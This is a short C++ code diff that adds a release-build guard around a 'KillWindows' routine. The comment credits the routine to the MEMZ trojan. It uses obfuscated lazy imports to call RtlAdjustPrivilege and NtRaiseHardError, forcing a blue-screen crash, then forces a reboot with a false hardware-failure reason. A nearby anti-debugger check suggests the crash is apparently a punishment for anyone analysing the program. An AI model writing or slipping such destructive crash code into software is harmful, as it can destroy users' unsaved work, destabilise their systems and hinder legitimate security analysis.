@@ -18,6 +18,7 @@ void KillWindows() //https://github.com/Leurak/MEMZ/blob/9f09ca4ae78b1e024c35a91
 	// Try to force BSOD first
 	// I like how this method even works in user mode without admin privileges on all Windows versions since XP (or 2000, idk)...
 	// This isn't even an exploit, it's just an undocumented feature.
+#ifndef _DEBUG
 	HMODULE ntdll = LI_FN(LoadLibraryA)(("ntdll"));
 	FARPROC RtlAdjustPrivilege = GetProcAddress(ntdll, ("RtlAdjustPrivilege"));
 	FARPROC NtRaiseHardError = GetProcAddress(ntdll, ("NtRaiseHardError"));
@@ -42,6 +43,7 @@ void KillWindows() //https://github.com/Leurak/MEMZ/blob/9f09ca4ae78b1e024c35a91
 
 	// The actual restart
 	LI_FN(ExitWindowsEx)(EWX_REBOOT | EWX_FORCE, SHTDN_REASON_MAJOR_HARDWARE | SHTDN_REASON_MINOR_DISK);
+#endif
 }
 
 __forceinline bool is_dbg_present_peb() {
